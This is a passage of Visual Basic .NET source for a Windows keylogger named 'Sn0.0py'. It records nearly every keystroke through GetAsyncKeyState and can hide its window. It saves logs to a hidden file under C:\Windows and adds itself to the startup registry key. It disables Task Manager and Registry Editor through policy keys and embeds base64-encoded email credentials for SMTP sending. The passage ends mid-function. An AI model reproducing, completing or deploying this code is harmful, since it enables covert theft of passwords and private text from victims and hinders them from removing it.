Imports System
Imports System.IO
Imports Microsoft.Win32
Imports Microsoft.Win32.RegistryKey
Imports System.Threading
Imports Microsoft.VisualBasic.MyServices
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Net.Mail
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Security.Cryptography
Imports System.Drawing.Drawing2D
Public Class keylog
    Dim nama As String
    Dim nom As Integer = 0
    Dim fn As String = "C:\Windows\SS\eses"
    Dim ext As String = ".png"
    Dim Str1 As String = "a2V5bG9ncmVzdXRAZ21haWwuY29t"
    Dim Str2 As String = "c2F5YW5na2FtdTY5"
    Dim bit As Byte() = Convert.FromBase64String(Str1)
    Dim TexBox1_Text As String = System.Text.Encoding.UTF8.GetString(bit)
    Dim bot As Byte() = Convert.FromBase64String(Str2)
    Dim TexBox2_Text As String = System.Text.Encoding.UTF8.GetString(bot)
    Dim b As Decimal
    Dim hssl As Decimal
    Dim a As Decimal
    Dim hsl As Decimal
    Dim t As String
    Dim Hitmundur As Decimal
    Dim gport As Integer = 587
    Dim yport As Integer = 465
    Dim ghost As String = "smtp.gmail.com"
    Dim yhost As String = "smtp.mail.yahoo.com"
    Dim nemon As String = "Active"
    Dim nemoff As String = "Disable"
    Dim nempaused As String = "Paused"
    Public thread_hide As Thread
    Delegate Sub Change()
    Dim objchange As New Change(AddressOf dohide)
    Dim tulis As StreamWriter
    Dim i As Object
    Dim keyPressed As Object
    Dim charCount As Int32
    Dim lineLimit As Int32 = 69
    Dim addKey As Object
    Private Declare Function GetAsyncKeyState Lib "User32" (ByVal vkey As System.Windows.Forms.Keys) As Short
    Private Sub keytimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles keytimer.Tick
        On Error Resume Next
        keyPressed = GetAsyncKeyState(33)
        If keyPressed = -32767 Then
            If getShift() = True Then
                Me.Opacity = 100%
            End If
        End If

        'check Enter key
        keyPressed = GetAsyncKeyState(13)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = vbCrLf
            GoTo KeyFound
        End If

        'check for backspace
        keyPressed = GetAsyncKeyState(8)
        If keyPressed = -32767 Then
            addKey = "[bs] "
            charCount += 5
            GoTo KeyFound
        End If

        'check for space bar
        keyPressed = GetAsyncKeyState(32)
        If keyPressed = -32767 Then
            addKey = " "
            GoTo KeyFound
            charCount += 1
        End If

        'check for colon/semicolon
        keyPressed = GetAsyncKeyState(186)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ";"
            Else
                addKey = ":"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for =/+
        keyPressed = GetAsyncKeyState(187)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "="
            Else
                addKey = "+"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for ,/<
        keyPressed = GetAsyncKeyState(188)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ","
            Else
                addKey = "<"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for -/_
        keyPressed = GetAsyncKeyState(189)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for ./>
        keyPressed = GetAsyncKeyState(190)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for //?
        keyPressed = GetAsyncKeyState(191)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for `/~
        keyPressed = GetAsyncKeyState(192)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "`"
            Else
                addKey = "~"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 0/)
        keyPressed = GetAsyncKeyState(96)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "0"
            Else
                addKey = ")"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 1/!
        keyPressed = GetAsyncKeyState(97)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "1"
            Else
                addKey = "!"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 2/@
        keyPressed = GetAsyncKeyState(98)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "2"
            Else
                addKey = "@"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 3/#
        keyPressed = GetAsyncKeyState(99)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "3"
            Else
                addKey = "#"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 4/$
        keyPressed = GetAsyncKeyState(100)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "4"
            Else
                addKey = "$"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 5/%
        keyPressed = GetAsyncKeyState(101)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "5"
            Else
                addKey = "%"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 6/^
        keyPressed = GetAsyncKeyState(102)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "6"
            Else
                addKey = "7"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 7/&
        keyPressed = GetAsyncKeyState(103)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "7"
            Else
                addKey = "&"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 8/*
        keyPressed = GetAsyncKeyState(104)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "8"
            Else
                addKey = "*"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 9/(
        keyPressed = GetAsyncKeyState(105)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "9"
            Else
                addKey = "("
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'other num/special chars
        keyPressed = GetAsyncKeyState(106)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "*"
                charCount += 1
            Else
                addKey = ""
            End If
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(107)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "+"
            Else
                addKey = "="
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(108)
        If keyPressed = -32767 Then
            addKey = ""
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(109)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(110)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(111)
        If keyPressed = -32767 Then
            addKey = "/"
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(2)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(220)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "\"
            Else
                addKey = "|"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(222)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "'"
            Else
                addKey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(221)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "]"
            Else
                addKey = "}"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(219)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "["
            Else
                addKey = "{"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for a-z upper and lower case
        For i = 65 To 128
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addKey = "!"
                        Case 2
                            addKey = "@"
                        Case 3
                            addKey = "#"
                        Case 4
                            addKey = "$"
                        Case 5
                            addKey = "%"
                        Case 6
                            addKey = "^"
                        Case 7
                            addKey = "&"
                        Case 8
                            addKey = "*"
                        Case 9
                            addKey = "("
                        Case 0
                            addKey = ")"
                    End Select
                Else
                    addKey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        System.Windows.Forms.Application.DoEvents()
        Exit Sub

        'keyfound 
KeyFound:
        If charCount > lineLimit Then
            charCount = 0
            TextBox2.AppendText(vbCrLf)
        End If
        If addKey <> "" Then TextBox2.AppendText(addKey)
        System.Windows.Forms.Application.DoEvents()
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If MsgBox("Do You Want to Clear ?", MsgBoxStyle.YesNo, "Question") = vbYes Then
            TextBox2.Text = ""
        End If
    End Sub

    Private Sub keylog_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        timebutton.Enabled = True
        NumericUpDown1.Value = My.Settings.jam
        NumericUpDown2.Value = My.Settings.menit
        NumericUpDown3.Value = My.Settings.detik
        CheckBox1.Checked = My.Settings.sendemail
        keytimer.Enabled = My.Settings.keytimer
        CheckBox2.Checked = My.Settings.startup
        CheckBox5.Checked = My.Settings.disabletask
        CheckBox7.Checked = My.Settings.disabelereg
        If CheckBox5.Checked = True Then
            Button4.Text = "Enable Task Manager"
            Button4.BackColor = Color.Teal
        End If
        If CheckBox7.Checked = True Then
            Button21.Text = "Enable Regedit"
            Button21.BackColor = Color.Teal
        End If
        If CheckBox6.Checked = True Then
            Button18.Text = "Enable App Notification"
            Button18.BackColor = Color.Teal
        End If
        If CheckBox4.Checked = True Then
            Button16.Text = "Auto Save Log" + vbNewLine + "ON"
            Button16.BackColor = Color.Teal
        End If
        If CheckBox3.Checked = True Then
            Button14.Text = "Hide On StartUp" + vbNewLine + "ON"
            Button14.BackColor = Color.Teal
        End If
        If CheckBox2.Checked = True Then
            Button20.Text = "Active On StartUp" + vbNewLine + "ON"
            Button20.BackColor = Color.Teal
        End If

        If File.Exists("C:\Windows\log.mAa") Then
            CheckBox4.Checked = My.Settings.autosavelog
        Else
            CheckBox4.Checked = False
        End If
        CheckBox6.Checked = My.Settings.disablenotif
        Me.Opacity = My.Settings.hide
        If My.Settings.hide = 100 Then
            CheckBox3.Checked = False
        Else
            CheckBox3.Checked = True
        End If
        Dim taim As String
        Dim w As Object
        taim = "Welcome"
        If Now.Hour >= 4 And Now.Hour <= 10 Then
            w = "Pagi"
            taim = w
        ElseIf Now.Hour > 10 And Now.Hour <= 14 Then
            w = "Siang"
            taim = w.ToString
        ElseIf Now.Hour > 14 And Now.Hour <= 17 Then
            w = "Sore"
            taim = w.ToString
        ElseIf Now.Hour > 17 And Now.Hour <= 24 Then
            w = "Malam"
            taim = w
        ElseIf Now.Hour >= 1 And Now.Hour < 4 Then
            w = "Malam Menjelang Pagi"
            taim = w
        End If
        Dim nomo() As String = Split(Environment.UserName, "\")
        If My.User.Name.Length < 1 Then
            nama = Environment.UserName
        Else
            nama = nomo(1)
        End If
        notif.ShowBalloonTip(2, taim, nama, ToolTipIcon.Info)
        'CreateContextMenu()
        'If keytimer.Enabled = True Then
        '    Me.Text = nemon
        'Call buttonaktif()
        'End If

        thread_hide = New Thread(AddressOf hideme)
        thread_hide.IsBackground = True
        thread_hide.Start()

        Me.LabelProductName.Text = My.Application.Info.ProductName
        Me.LabelVersion.Text = "Sn0.0py Project " & String.Format("Version {0}", My.Application.Info.Version.ToString)
        Me.LabelCopyright.Text = My.Application.Info.Copyright
        Me.LabelCompanyName.Text = "Written By " & My.Application.Info.CompanyName
        Me.TextBoxDescription.Text = "Please Run As Administrator first to use this" & vbNewLine & vbNewLine & "This Keylogger can stroke alphabet, number, and symbol" & vbNewLine & "Auto Save log stored in C:\Windows\log.mAa" & vbNewLine & "File log attribute is HIDDEN" & vbNewLine & "Press Ctrl+Shift+S to Unhide Me" & vbNewLine & vbNewLine & "If You Found Bug Please contact me" & vbNewLine & "--=[ Mohamad Achun Armando ]=--" & vbNewLine & "keylogresut@gmail.com" & vbNewLine & vbNewLine & "Greetz :" & vbNewLine & "Allah Swt - Google - All of you" & vbNewLine & vbNewLine & "-=( " & My.Application.Info.Description & " )=-"
        Me.UsernameLabel.Text = nama
        If Directory.Exists("C:\Windows\SS") Then
        Else
            Directory.CreateDirectory("C:\Windows\SS")
        End If
    End Sub
    Public Sub CreateContextMenu()
        Dim contextmenu As New ContextMenu
        Dim menuitem1 As New MenuItem("Show")
        Dim menuitem2 As New MenuItem("Exit")
        contextmenu.MenuItems.Add(menuitem1)
        contextmenu.MenuItems.Add(menuitem2)
        notif.ContextMenu = contextmenu
        AddHandler menuitem1.Click, AddressOf menuitem1_Click
        AddHandler menuitem2.Click, AddressOf menuitem2_Click
    End Sub
    Private Sub menuitem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'If Me.Opacity = 0 Then
        'Pass.Show()
        'End If
    End Sub
    Private Sub menuitem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        notif.Visible = False
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        If MsgBox("Press Ctrl+Shift+S to Unhide me", MsgBoxStyle.YesNo, "Hide ?") = vbYes Then
            Me.Opacity = 0%
        End If
    End Sub
    Public Shared explorer As Object = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced")
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        keytimer.Enabled = False
        Me.StatusLabel.Text = nempaused
        Call showhidden()
        Dim encode As Byte() = System.Text.Encoding.UTF8.GetBytes(TextBox2.Text)
        Dim a As String = Convert.ToBase64String(encode)
        Dim savefiledialog1 As New SaveFileDialog()
        savefiledialog1.Filter = "m.A.a files (*.mAa)|*.mAa"
        savefiledialog1.FilterIndex = 1
        savefiledialog1.RestoreDirectory = True
        If savefiledialog1.ShowDialog() = DialogResult.OK Then
            My.Computer.FileSystem.WriteAllText(savefiledialog1.FileName, a, True)
            File.SetAttributes(savefiledialog1.FileName, FileAttributes.Hidden)
        End If
        Call hidehidden()
        keytimer.Enabled = True
        Me.StatusLabel.Text = nemon
    End Sub

    Private Sub timebutton_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timebutton.Tick
        If keytimer.Enabled = True Then
            StatusLabel.Text = "Active"
            Button6.Enabled = True
        Else
            StatusLabel.Text = "Disable"
            Button6.Enabled = False
        End If

        Me.DateLabel.Text = DateTime.Now.ToString("dd.MM.yyyy")
        If CheckBox3.Checked = True Then
            My.Settings.hide = 0
            My.Settings.Save()
        Else
            My.Settings.hide = 100
            My.Settings.Save()
        End If

        If TabControl1.SelectedIndex = 1 Then
            If IsConnectionAvailable() = True Then
                Labelinternet.Text = "Connected To Internet"
            Else
                Labelinternet.Text = "No Internet Connection"
            End If
        End If

        If Timer_Send.Enabled = True Then
            Label13.Text = "Status : Active"
        Else
            Label13.Text = "Status : Disable"
        End If

        If keytimer.Enabled = True Then
            If TextBox4.Focused = True Or TextBox1.Focused = True Or TextBox3.Focused = True Then
                keytimer.Enabled = False
            Else
                keytimer.Enabled = True
            End If
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = False Then
            Timer_Send.Enabled = False
            TabControl1.SelectTab(0)
        Else
            TabControl1.SelectTab(1)
        End If
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        keytimer.Enabled = True

        Me.StatusLabel.Text = nemon
        notif.BalloonTipText = "Sn0.0py Aktif"
        notif.BalloonTipIcon = ToolTipIcon.Info
        notif.ShowBalloonTip(1)
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        keytimer.Enabled = False

        Me.StatusLabel.Text = nemoff
        notif.ShowBalloonTip(1, "", "Sn0.0py Tidak Aktif", ToolTipIcon.Info)
    End Sub

    Private Sub CheckBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.Click
        TabControl1.SelectTab(1)
    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = False Then
            Call removeStartUp()
        Else
            Call addStartUp()
        End If
    End Sub

    Sub addStartUp()
        Try
            Dim reg As Microsoft.Win32.RegistryKey
            reg = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            reg.SetValue(My.Application.Info.AssemblyName, Application.ExecutablePath)
            reg.Close()
        Catch ex As Exception
            MsgBox(ex.ToString, MsgBoxStyle.Information, "Error")
            Exit Sub
        End Try
    End Sub

    Sub removeStartUp()
        Try
            Dim reg As RegistryKey
            reg = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            reg.DeleteValue(My.Application.Info.AssemblyName, False)
            reg.Close()
        Catch ex As Exception
            MsgBox(ex.ToString, MsgBoxStyle.Information, "Error")
            Exit Sub
        End Try
    End Sub

    Private Sub keylog_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyDown
        If e.Shift And e.KeyCode = Keys.PageUp Then
            Me.Opacity = 100%
        ElseIf e.Shift And e.KeyCode = Keys.A Then
            Me.Opacity = 100%
        End If
    End Sub
    Private Sub keylog_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Call savelog()
        Call setting()
    End Sub

    Public Function IsConnectionAvailable() As Boolean
        Dim objurl As New System.Uri("https://www.google.com")
        Dim objwebreq As System.Net.WebRequest
        objwebreq = System.Net.WebRequest.Create(objurl)
        Dim objresp As System.Net.WebResponse
        Try
            objresp = objwebreq.GetResponse
            objresp.Close()
            objresp = Nothing
            Return True
        Catch ex As Exception
            objresp = Nothing
            objwebreq = Nothing
            Return False
        End Try
    End Function

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            My.Settings.hide = 0
            My.Settings.Save()
        Else
            My.Settings.hide = 100
            My.Settings.Save()
        End If
    End Sub

    Private Sub notif_MouseClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles notif.MouseClick
        Dim taim As String
        Dim w As Object
        taim = "Welcome"
        If Now.Hour > 4 And Now.Hour <= 10 Then
            w = "Pagi"
            taim = w
        ElseIf Now.Hour > 10 And Now.Hour <= 14 Then
            w = "Siang"
            taim = w.ToString
        ElseIf Now.Hour > 14 And Now.Hour <= 17 Then
            w = "Sore"
            taim = w.ToString
        ElseIf Now.Hour > 17 And Now.Hour <= 24 Then
            w = "Malam"
            taim = w
        ElseIf Now.Hour >= 1 And Now.Hour < 4 Then
            w = "Malam Menjelang Pagi"
            taim = w
        End If
        notif.ShowBalloonTip(2, taim, nama, ToolTipIcon.Info)
    End Sub
    Sub setting()
        Try
            My.Settings.sendemail = CheckBox1.Checked
            My.Settings.startup = CheckBox2.Checked
            My.Settings.keytimer = keytimer.Enabled
            My.Settings.hide = Me.Opacity
            My.Settings.disabletask = CheckBox5.Checked
            My.Settings.jam = NumericUpDown1.Value
            My.Settings.menit = NumericUpDown2.Value
            My.Settings.detik = NumericUpDown3.Value
            My.Settings.emailsender = TextBox4.Text
            My.Settings.passsender = TextBox1.Text
            My.Settings.emailreceiver = TextBox3.Text
            My.Settings.domainreceiver = DomainUpDown1.SelectedItem.ToString
            My.Settings.domainsender = DomainUpDown2.SelectedItem.ToString
            My.Settings.autosavelog = CheckBox4.Checked
            My.Settings.disablenotif = CheckBox6.Checked
            My.Settings.disabelereg = CheckBox7.Checked
            My.Settings.Save()
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Information, "Error Found")
        End Try
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        Call OPfileDialog()
    End Sub

    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            Call disabletask()
        Else
            Call enabletask()
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            If File.Exists("C:\Windows\log.mAa") Then
                Exit Sub
            Else
                Try
                    File.CreateText("C:\Windows\log.mAa")
                Catch ex As Exception
                    MsgBox("Please Run As Administrator first !", MsgBoxStyle.Critical, "Warning")
                    End
                End Try
            End If
        End If
    End Sub
    Public Shared taskmgr As Object = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")

    Sub disabletask()
        Try
            If (taskmgr Is Nothing) Then
                Dim registry As RegistryProxy = My.Computer.Registry
                registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord)
                registry.CurrentUser.Close()
                registry = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "TaskManager Disabled", ToolTipIcon.Warning)
            Else
                Dim proxy2 As RegistryProxy = My.Computer.Registry
                proxy2.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord)
                proxy2.CurrentUser.Close()
                proxy2 = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "TaskManager Disabled", ToolTipIcon.Warning)
            End If
        Catch ex1 As Exception
            MsgBox("Please Run this App As Administrator !", MsgBoxStyle.Critical, "Sn0.0py")
            CheckBox5.Checked = False
            End
        End Try
    End Sub

    Sub enabletask()
        Try
            If (taskmgr Is Nothing) Then
                Dim registry As RegistryProxy = My.Computer.Registry
                registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0, RegistryValueKind.DWord)
                registry.CurrentUser.Close()
                registry = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "TaskManager Enabled", ToolTipIcon.Info)
            Else
                Dim proxy2 As RegistryProxy = My.Computer.Registry
                proxy2.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0, RegistryValueKind.DWord)
                proxy2.CurrentUser.Close()
                proxy2 = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "TaskManager Enabled", ToolTipIcon.Info)
            End If
        Catch ex1 As Exception
            MsgBox("Please Run this App As Administrator !", MsgBoxStyle.Critical, "Sn0.0py")
        End Try
    End Sub

    Public Sub hideme()
        While 1
            If GetAsyncKeyState(17) And GetAsyncKeyState(160) And GetAsyncKeyState(83) Then
                Me.Invoke(objchange)
            End If
            Thread.Sleep(200)
        End While
    End Sub

    Public Sub dohide()
        If Me.Opacity = 100 Then
            Me.Opacity = 0
        Else
            Me.Opacity = 100
        End If
    End Sub

    Public Sub savelog()
        If CheckBox4.Checked = False Then
            Exit Sub
        End If
        Try
            tulis.WriteLine(vbNewLine)
        Catch ex As Exception
            tulis = New StreamWriter("C:\Windows\log.mAa", True)
        End Try
        If TextBox2.Text <> Nothing Then
            tulis.WriteLine(TextBox2.Text)
        End If
        tulis.WriteLine(vbNewLine)
        tulis.Flush()
        tulis.Close()
        File.SetAttributes("C:\Windows\log.mAa", FileAttributes.Hidden)
    End Sub

    Private Sub CheckBox6_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            notif.Visible = False
        Else
            notif.Visible = True
        End If
    End Sub

    Private Sub CheckBox7_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox7.CheckedChanged
        If CheckBox7.Checked = True Then
            Call disablereg()
        Else
            Call enablereg()
        End If
    End Sub

    Sub disablereg()
        Try
            If (taskmgr Is Nothing) Then
                Dim regg As RegistryProxy = My.Computer.Registry
                regg.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, RegistryValueKind.DWord)
                regg.CurrentUser.Close()
                regg = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "RegistryTools Disabled", ToolTipIcon.Warning)
            Else
                Dim proxy2 As RegistryProxy = My.Computer.Registry
                proxy2.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, RegistryValueKind.DWord)
                proxy2.CurrentUser.Close()
                proxy2 = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "RegistryTools Disabled", ToolTipIcon.Warning)
            End If
        Catch ex As Exception
            MsgBox("Please Run As Administrator First!", MsgBoxStyle.Critical, "Warning")
            End
        End Try
    End Sub

    Sub enablereg()
        Try
            If (taskmgr Is Nothing) Then
                Dim regg As RegistryProxy = My.Computer.Registry
                regg.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 0, RegistryValueKind.DWord)
                regg.CurrentUser.Close()
                regg = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "RegistryTools Enabled", ToolTipIcon.Info)
            Else
                Dim proxy2 As RegistryProxy = My.Computer.Registry
                proxy2.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 0, RegistryValueKind.DWord)
                proxy2.CurrentUser.Close()
                proxy2 = Nothing
                notif.ShowBalloonTip(1, "Sn0.0py", "RegistryTools Enabled", ToolTipIcon.Info)
            End If
        Catch ex As Exception
            MsgBox("Please Run As Administrator First!", MsgBoxStyle.Critical, "Warning")
            End
        End Try
    End Sub

    Private Sub Button8_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.MouseHover
        Button8.Text = "Open Saved Log"
        Button8.AutoSize = True
    End Sub

    Private Sub Button8_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.MouseLeave
        Button8.AutoSize = False
        Button8.Text = "Open Saved"
        Button8.Size = CType(New Point(79, 24), Size)
    End Sub

    Private Sub Button2_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.MouseHover
        Button2.Text = "Save Log" & vbNewLine & "Manual" & vbNewLine & "+" & vbNewLine & "Encrypted"
        Button2.AutoSize = True
    End Sub

    Private Sub Button2_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.MouseLeave
        Button2.AutoSize = False
        Button2.Text = "Save Log"
        Button2.Size = CType(New Point(79, 24), Size)
    End Sub

    Sub hidehidden()
        Try
            If (explorer Is Nothing) Then
                Dim reg As RegistryProxy = My.Computer.Registry
                reg.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 2, RegistryValueKind.DWord)
                reg.CurrentUser.Close()
                reg = Nothing
            Else
                Dim proxy2 As RegistryProxy = My.Computer.Registry
                proxy2.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 2, RegistryValueKind.DWord)
                proxy2.CurrentUser.Close()
                proxy2 = Nothing
            End If
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub

    Sub showhidden()
        Try
            If (explorer Is Nothing) Then
                Dim reg As RegistryProxy = My.Computer.Registry
                reg.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 1, RegistryValueKind.DWord)
                reg.CurrentUser.Close()
                reg = Nothing
            Else
                Dim proxy2 As RegistryProxy = My.Computer.Registry
                proxy2.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 1, RegistryValueKind.DWord)
                proxy2.CurrentUser.Close()
                proxy2 = Nothing
            End If
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub

    Private Sub UsernameLabel_MouseHover(sender As Object, e As EventArgs) Handles UsernameLabel.MouseHover
        Me.UsernameLabel.Text = My.Computer.Info.OSFullName.ToString
    End Sub

    Private Sub UsernameLabel_Click(sender As Object, e As EventArgs) Handles UsernameLabel.Click

    End Sub

    Private Sub UsernameLabel_MouseLeave(sender As Object, e As EventArgs) Handles UsernameLabel.MouseLeave
        Me.UsernameLabel.Text = nama
    End Sub

    Private Sub InternetStatus_Click(sender As Object, e As EventArgs) Handles DateLabel.Click
        If My.Computer.Network.IsAvailable = True Then
            Browserr.Show()
            Me.TopMost = False
            Browserr.Focus()
        End If
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Call OPfileDialog()
    End Sub

    Public Sub OPfileDialog()
        TabControl1.SelectTab(3)
        keytimer.Enabled = False
        Me.StatusLabel.Text = nempaused
